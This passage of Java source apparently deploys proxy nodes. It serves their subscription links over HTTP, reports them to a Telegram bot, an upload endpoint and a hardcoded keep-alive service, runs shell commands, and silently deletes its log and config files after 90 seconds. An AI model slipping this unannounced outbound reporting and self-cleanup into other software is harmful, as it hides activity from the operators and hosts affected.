            String s5Auth = Base64.getEncoder().encodeToString((UUID.substring(0,8) + ":" + UUID.substring(UUID.length()-12)).getBytes(StandardCharsets.UTF_8));
            subTxtBuilder.append(String.format("socks://%s@%s:%d#%s", s5Auth, serverIp, S5_PORT, nodename));
        }

        String subTxt = subTxtBuilder.toString();
        String subTxtB64 = Base64.getEncoder().encodeToString(subTxt.getBytes(StandardCharsets.UTF_8));

        Files.writeString(Paths.get(sub_path), subTxtB64);
        Files.writeString(Paths.get(list_path), subTxt);
        
        System.out.println("\033[32m" + subTxtB64 + "\033[0m");

        sendTelegram();
        uploadNodes();
    }

    private static void uploadNodes() {
        if (!UPLOAD_URL.isEmpty() && !PROJECT_URL.isEmpty()) {
            try {
                HttpRequest req = HttpRequest.newBuilder().uri(URI.create(UPLOAD_URL + "/api/add-subscriptions"))
                    .header("Content-Type", "application/json").POST(HttpRequest.BodyPublishers.ofString(toJson(Map.of("subscription", List.of(PROJECT_URL + "/" + SUB_PATH))))).build();
                httpClient.send(req, HttpResponse.BodyHandlers.discarding());
            } catch (Exception ignored) {}
        } else if (!UPLOAD_URL.isEmpty()) {
            if (!new File(list_path).exists()) return;
            try {
                String content = Files.readString(Paths.get(list_path));
                List<String> nodes = new ArrayList<>();
                for (String line : content.split("\n")) {
                    if (line.contains("vless://") || line.contains("vmess://") || line.contains("trojan://") ||
                        line.contains("hysteria2://") || line.contains("tuic://") || line.contains("anytls://") || line.contains("socks://")) {
                        nodes.add(line);
                    }
                }
                if (nodes.isEmpty()) return;
                HttpRequest req = HttpRequest.newBuilder().uri(URI.create(UPLOAD_URL + "/api/add-nodes"))
                    .header("Content-Type", "application/json").POST(HttpRequest.BodyPublishers.ofString(toJson(Map.of("nodes", nodes)))).build();
                httpClient.send(req, HttpResponse.BodyHandlers.discarding());
            } catch (Exception ignored) {}
        }
    }

    private static void deleteNodes() {
        if (UPLOAD_URL.isEmpty() || !new File(sub_path).exists()) return;
        try {
            String content = Files.readString(Paths.get(sub_path));
            String decoded = new String(Base64.getDecoder().decode(content.trim()), StandardCharsets.UTF_8);
            List<String> nodes = new ArrayList<>();
            for (String line : decoded.split("\n")) {
                if (line.contains("://")) nodes.add(line);
            }
            if (nodes.isEmpty()) return;
            HttpRequest request = HttpRequest.newBuilder().uri(URI.create(UPLOAD_URL + "/api/delete-nodes"))
                .header("Content-Type", "application/json").POST(HttpRequest.BodyPublishers.ofString(toJson(Map.of("nodes", nodes)))).build();
            httpClient.send(request, HttpResponse.BodyHandlers.discarding());
        } catch (Exception ignored) {}
    }

    private static void sendTelegram() {
        if (BOT_TOKEN.isEmpty() || CHAT_ID.isEmpty()) return;
        try {
            String message = Files.readString(Paths.get(sub_path));
            String escapedName = NAME.replaceAll("([_*\\\\\\[\\]()~>#+=|{}.!\\-])", "\\\\$1");
            String text = "**" + escapedName + "推送通知**\n" + message;

            String url = String.format("https://api.telegram.org/bot%s/sendMessage", BOT_TOKEN);
            String formData = "chat_id=" + URLEncoder.encode(CHAT_ID, StandardCharsets.UTF_8) +
                              "&text=" + URLEncoder.encode(text, StandardCharsets.UTF_8) +
                              "&parse_mode=MarkdownV2";

            HttpRequest req = HttpRequest.newBuilder().uri(URI.create(url)).header("Content-Type", "application/x-www-form-urlencoded")
                .POST(HttpRequest.BodyPublishers.ofString(formData)).build();
            httpClient.send(req, HttpResponse.BodyHandlers.discarding());
        } catch (Exception ignored) {}
    }

    private static void addVisitTask() {
        if (!AUTO_ACCESS || PROJECT_URL.isEmpty()) return;
        try {
            HttpRequest req = HttpRequest.newBuilder().uri(URI.create("https://keep.gvrander.eu.org/add-url"))
                .header("Content-Type", "application/json").POST(HttpRequest.BodyPublishers.ofString(toJson(Map.of("url", PROJECT_URL)))).build();
            httpClient.send(req, HttpResponse.BodyHandlers.discarding());
        } catch (Exception ignored) {}
    }

    private static void cleanFilesLater() {
        ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.schedule(() -> {
            List<String> filesToDelete = new ArrayList<>(Arrays.asList(boot_log_path, config_path, list_path));
            for (String fStr : filesToDelete) {
                try {
                    File f = new File(fStr);
                    if (f.exists() && !f.isDirectory()) {
                        f.delete();
                    }
                } catch (Exception ignored) {}
            }
        }, 90, TimeUnit.SECONDS);
    }

    private static String execCmd(String command) {
        StringBuilder output = new StringBuilder();
        try {
            ProcessBuilder pb = new ProcessBuilder("sh", "-c", command);
            pb.directory(new File(FILE_PATH));
            pb.redirectErrorStream(true);
            Process process = pb.start();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }
            process.waitFor();
        } catch (Exception e) {
            return e.getMessage();
        }
        return output.toString();
    }

    private static void runHttpServer() {
        try {
            HttpServer server = HttpServer.create(new InetSocketAddress("0.0.0.0", PORT), 0);
            server.createContext("/", exchange -> {
                String path = exchange.getRequestURI().getPath();
                if ("/".equals(path)) {
                    File index = new File(index_path);
                    if (index.exists()) {
                        byte[] content = Files.readAllBytes(index.toPath());
                        exchange.getResponseHeaders().set("Content-Type", "text/html");
                        exchange.sendResponseHeaders(200, content.length);
                        try (OutputStream os = exchange.getResponseBody()) { os.write(content); }
                    } else {
                        byte[] content = ("Hello world!<br><br>You can visit /" + SUB_PATH + " get your nodes!").getBytes(StandardCharsets.UTF_8);
                        exchange.getResponseHeaders().set("Content-Type", "text/html");
                        exchange.sendResponseHeaders(200, content.length);
                        try (OutputStream os = exchange.getResponseBody()) { os.write(content); }
                    }
                } else if (("/" + SUB_PATH).equals(path)) {
                    File subFile = new File(sub_path);
                    if (subFile.exists()) {
                        byte[] content = Files.readAllBytes(subFile.toPath());
                        exchange.getResponseHeaders().set("Content-Type", "text/plain");
                        exchange.sendResponseHeaders(200, content.length);
                        try (OutputStream os = exchange.getResponseBody()) { os.write(content); }
                    } else {
                        exchange.sendResponseHeaders(404, -1);
                    }
                } else {
                    exchange.sendResponseHeaders(404, -1);
                }
            });
            server.setExecutor(null);
            server.start();
        } catch (IOException ignored) {}
    }

    @SuppressWarnings("unchecked")
    private static String toJson(Object obj) {
        if (obj == null) return "null";
        if (obj instanceof String) {
            String str = (String) obj;
            str = str.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
            return "\"" + str + "\"";
        }
        if (obj instanceof Number || obj instanceof Boolean) return obj.toString();
        if (obj instanceof List) {
            StringJoiner sj = new StringJoiner(",", "[", "]");
            for (Object item : (List<?>) obj) sj.add(toJson(item));
            return sj.toString();
        }
        if (obj instanceof Map) {
            StringJoiner sj = new StringJoiner(",", "{", "}");
            for (Map.Entry<?, ?> entry : ((Map<?, ?>) obj).entrySet()) {
                sj.add("\"" + entry.getKey().toString() + "\":" + toJson(entry.getValue()));
            }
            return sj.toString();
        }
        return "\"" + obj.toString() + "\"";
    }
}
